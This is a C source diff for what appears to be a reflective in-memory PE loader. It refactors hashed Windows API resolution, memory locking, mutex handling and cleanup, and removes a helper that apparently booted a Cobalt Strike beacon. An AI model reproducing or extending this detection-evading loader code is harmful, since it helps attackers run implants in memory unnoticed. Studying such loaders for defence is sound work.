@@ -27,8 +27,6 @@ typedef struct {
     VirtualAlloc_t          VirtualAlloc;
     VirtualFree_t           VirtualFree;
     VirtualProtect_t        VirtualProtect;
-    VirtualLock_t           VirtualLock;
-    VirtualUnlock_t         VirtualUnlock;
     LoadLibraryA_t          LoadLibraryA;
     FreeLibrary_t           FreeLibrary;
     GetProcAddress_t        GetProcAddress;
@@ -317,8 +315,6 @@ static bool initPELoaderAPI(PELoader* loader)
         { 0x21E5E7E61968BBF4, 0x38FC2BB8B9E8F0B1 }, // VirtualAlloc
         { 0x7DDAB5BF4E742736, 0x6E0D1E4F5D19BE67 }, // VirtualFree
         { 0x6CF439115B558DE1, 0x7CAC9554D5A67E28 }, // VirtualProtect
-        { 0xFAC73FAE41C0C2C8, 0xE7A0EE8E5CBAB70B }, // VirtualLock
-        { 0x17C8D1591CA0850F, 0x64458856130C1CE7 }, // VirtualUnlock
         { 0x90BD05BA72DD948C, 0x253672CEAE439BB6 }, // LoadLibraryA
         { 0x0322C392AB9AE610, 0x2CF3559162E79E91 }, // FreeLibrary
         { 0xF4E6DE881A59F6A0, 0xBC2E958CCBE70AA2 }, // GetProcAddress
@@ -340,8 +336,6 @@ static bool initPELoaderAPI(PELoader* loader)
         { 0x28310500, 0x51C40B22 }, // VirtualAlloc
         { 0xBC28097D, 0x4483038A }, // VirtualFree
         { 0x7B578622, 0x6950410A }, // VirtualProtect
-        { 0x54914D83, 0xA9606A64 }, // VirtualLock
-        { 0xCEDF8C40, 0x6D73766F }, // VirtualUnlock
         { 0x3DAF1E96, 0xD7E436F3 }, // LoadLibraryA
         { 0x2BC5BE30, 0xC2B2D69A }, // FreeLibrary
         { 0xE971801A, 0xEC6F6D90 }, // GetProcAddress
@@ -372,30 +366,28 @@ static bool initPELoaderAPI(PELoader* loader)
     loader->VirtualAlloc          = list[0x00].proc;
     loader->VirtualFree           = list[0x01].proc;
     loader->VirtualProtect        = list[0x02].proc;
-    loader->VirtualLock           = list[0x03].proc;
-    loader->VirtualUnlock         = list[0x04].proc;
-    loader->LoadLibraryA          = list[0x05].proc;
-    loader->FreeLibrary           = list[0x06].proc;
-    loader->GetProcAddress        = list[0x07].proc;
-    loader->CreateThread          = list[0x08].proc;
-    loader->ExitThread            = list[0x09].proc;
-    loader->FlushInstructionCache = list[0x0A].proc;
-    loader->CreateMutexA          = list[0x0B].proc;
-    loader->ReleaseMutex          = list[0x0C].proc;
-    loader->WaitForSingleObject   = list[0x0D].proc;
-    loader->CloseHandle           = list[0x0E].proc;
-    loader->GetCommandLineA       = list[0x0F].proc;
-    loader->GetCommandLineW       = list[0x10].proc;
-    loader->LocalFree             = list[0x11].proc;
-    loader->GetStdHandle          = list[0x12].proc;
-    loader->ExitProcess           = list[0x13].proc;
+    loader->LoadLibraryA          = list[0x03].proc;
+    loader->FreeLibrary           = list[0x04].proc;
+    loader->GetProcAddress        = list[0x05].proc;
+    loader->CreateThread          = list[0x06].proc;
+    loader->ExitThread            = list[0x07].proc;
+    loader->FlushInstructionCache = list[0x08].proc;
+    loader->CreateMutexA          = list[0x09].proc;
+    loader->ReleaseMutex          = list[0x0A].proc;
+    loader->WaitForSingleObject   = list[0x0B].proc;
+    loader->CloseHandle           = list[0x0C].proc;
+    loader->GetCommandLineA       = list[0x0D].proc;
+    loader->GetCommandLineW       = list[0x0E].proc;
+    loader->LocalFree             = list[0x0F].proc;
+    loader->GetStdHandle          = list[0x10].proc;
+    loader->ExitProcess           = list[0x11].proc;
     return true;
 }
 
 static bool lockMainMemPage(PELoader* loader)
 {
 #ifndef NO_RUNTIME
-    if (!loader->VirtualLock(loader->MainMemPage, 0))
+    if (!loader->Runtime->Memory.Lock(loader->MainMemPage))
     {
         return false;
     }
@@ -454,6 +446,14 @@ static errno initPELoaderEnvironment(PELoader* loader)
         return ERR_LOADER_CREATE_G_MUTEX;
     }
     loader->hMutex = hMutex;
+    // lock mutex
+#ifndef NO_RUNTIME
+    if (!loader->Runtime->Resource.LockMutex(hMutex))
+    {
+        loader->CloseHandle(hMutex);
+        return ERR_LOADER_LOCK_G_MUTEX;
+    }
+#endif // NO_RUNTIME
     return NO_ERROR;
 }
 
@@ -575,7 +575,7 @@ static bool mapSections(PELoader* loader)
     loader->PEImage = (uintptr)mem;
     // lock memory region with special argument for reuse PE image
 #ifndef NO_RUNTIME
-    if (!loader->VirtualLock(mem, 0))
+    if (!loader->Runtime->Memory.Lock(mem))
     {
         return false;
     }
@@ -686,7 +686,7 @@ static bool initTLSDirectory(PELoader* loader)
     loader->TLSLen   = total;
 #ifndef NO_RUNTIME
     // lock memory region with special argument for reuse PE image
-    if (!loader->VirtualLock(block, 0))
+    if (!loader->Runtime->Memory.Lock(block))
     {
         return false;
     }
@@ -743,7 +743,7 @@ static bool backupPEImage(PELoader* loader)
     mem_copy(mem, (void*)(loader->PEImage), loader->ImageSize);
 #ifndef NO_RUNTIME
     // lock memory region with special argument for reuse PE image
-    if (!loader->VirtualLock(mem, 0))
+    if (!loader->Runtime->Memory.Lock(mem))
     {
         return false;
     }
@@ -806,10 +806,8 @@ static errno cleanPELoader(PELoader* loader)
 {
     errno errno = NO_ERROR;
 
-    CloseHandle_t   closeHandle   = loader->CloseHandle;
-    FreeLibrary_t   freeLibrary   = loader->FreeLibrary;
-    VirtualUnlock_t virtualUnlock = loader->VirtualUnlock;
-    VirtualFree_t   virtualFree   = loader->VirtualFree;
+    CloseHandle_t closeHandle = loader->CloseHandle;
+    VirtualFree_t virtualFree = loader->VirtualFree;
 
     if (closeHandle != NULL)
     {
@@ -831,60 +829,13 @@ static errno cleanPELoader(PELoader* loader)
         }
     }
 
-#ifndef NO_RUNTIME
-    if (freeLibrary != NULL)
-    {
-        // free all tracked librarys
-        if (!freeLibrary(NULL) && errno == NO_ERROR)
-        {
-            errno = ERR_LOADER_FREE_LIBRARY;
-        }
-    }
-#endif // NO_RUNTIME
-
-    void* memPage  = loader->MainMemPage;
-    void* peImage  = (void*)(loader->PEImage);
-    void* peBackup = loader->PEBackup;
-    void* tlsBlock = loader->TLSBlock;
-
-    if (virtualUnlock != NULL)
-    {
-        // unlock memory page for PE image
-        if (peImage != NULL)
-        {
-            if (!virtualUnlock(peImage, 0) && errno == NO_ERROR)
-            {
-                errno = ERR_LOADER_UNLOCK_PE_IMAGE;
-            }
-        }
-        // unlock memory page for PE image backup
-        if (peBackup != NULL)
-        {
-            if (!virtualUnlock(peBackup, 0) && errno == NO_ERROR)
-            {
-                errno = ERR_LOADER_UNLOCK_BACKUP;
-            }
-        }
-        // unlock memory page for TLS block template
-        if (tlsBlock != NULL)
-        {
-            if (!virtualUnlock(tlsBlock, 0) && errno == NO_ERROR)
-            {
-                errno = ERR_LOADER_UNLOCK_TLS_BLOCK;
-            }
-        }
-        // unlock main memory page for structure
-        if (memPage != NULL)
-        {
-            if (!virtualUnlock(memPage, 0) && errno == NO_ERROR)
-            {
-                errno = ERR_LOADER_UNLOCK_MAIN_MEM;
-            }
-        }
-    }
-
     if (virtualFree != NULL)
     {
+        void* peImage  = (void*)(loader->PEImage);
+        void* peBackup = loader->PEBackup;
+        void* tlsBlock = loader->TLSBlock;
+        void* memPage  = loader->MainMemPage;
+
         // release memory page for PE image
         if (peImage != NULL)
         {
@@ -1054,6 +1005,14 @@ static errno ldr_init_mutex()
         return ERR_LOADER_CREATE_S_MUTEX;
     }
     loader->StatusMu = statusMu;
+    // lock mutex
+#ifndef NO_RUNTIME
+    if (!loader->Runtime->Resource.LockMutex(statusMu))
+    {
+        loader->CloseHandle(statusMu);
+        return ERR_LOADER_LOCK_S_MUTEX;
+    }
+#endif // NO_RUNTIME
     return NO_ERROR;
 }
 
@@ -1877,19 +1836,6 @@ static bool pe_dll_main(DWORD dwReason, bool setExitCode)
     return retval;
 }
 
-// TODO remove it, it for boot CS beacon
-__declspec(noinline)
-static bool pe_dll_main2()
-{
-    PELoader* loader = getPELoaderPointer();
-
-    // call dll main function
-    DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
-    HMODULE   hModule = (HMODULE)(loader->PEImage);
-    bool retval = dllMain(hModule, 4, (LPVOID)0x0000000056A2B5F0);
-    return retval;
-}
-
 static void set_exit_code(uint code)
 {
     PELoader* loader = getPELoaderPointer();
@@ -2012,13 +1958,12 @@ errno LDR_Execute()
         if (loader->IsDLL)
         {
             // TODO recover
-            ldr_alloc_tls_block();
-            ldr_tls_callback(DLL_PROCESS_ATTACH);
+            // ldr_alloc_tls_block();
+            // ldr_tls_callback(DLL_PROCESS_ATTACH);
             if (!pe_dll_main(DLL_PROCESS_ATTACH, true))
             {
                 errno = ERR_LOADER_CALL_DLL_MAIN;
             }
-            pe_dll_main2();
             break;
         }
         // change the running status
